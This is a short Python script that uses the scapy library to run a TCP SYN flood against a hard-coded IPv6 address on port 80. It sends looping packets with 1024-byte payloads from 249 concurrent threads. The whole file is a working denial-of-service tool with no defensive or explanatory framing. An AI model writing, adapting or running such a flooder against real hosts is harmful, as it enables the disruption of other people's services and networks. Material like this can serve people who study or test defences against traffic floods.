#!/usr/bin/python3
from decimal import ExtendedContext

from scapy.all import *
import threading
import sys, time

#parameters
#target_ip = '192.168.177.129'
target_ip = 'fe80::1fcb:85ef:39a9:2812'
target_port = 80 

def tcp_synACK (target_ip, target_port):
    ipv6 = IPv6(dst= target_ip)
    tcp = TCP(sport = RandShort(), dport = target_port, flags = 'S')

    raw = Raw(b"x"*1024)
    packet = ipv6/tcp/raw
    send(packet, loop=1, verbose= 1)

try:
    threads_ = []
    for i in range (1,250):
    	new_thread = 't' + str(i)
    	threads_.append(new_thread)
    ##threads_ = ['t1', 't2', 't3', 't4', 't5', 't6', 't7', 't8', 't9', 't10', 't11', 't12', 't13', 't14', 't15', 't16']
    for i in range (len(threads_)):
        threads_[i] = threading.Thread(target = tcp_synACK, args = (target_ip, target_port))


    for i in range (len(threads_)):
        threads_[i].daemon = True

    ### Start threads
    for i in range (len(threads_)):
        threads_[i].start()

    ### Join threads to run concurrently
    for i in range (len(threads_)):
        threads_[i].join()

except KeyboardInterrupt:
    sys.exit('\n[+]Exiting')

except Exception as e:
    print(e)



    
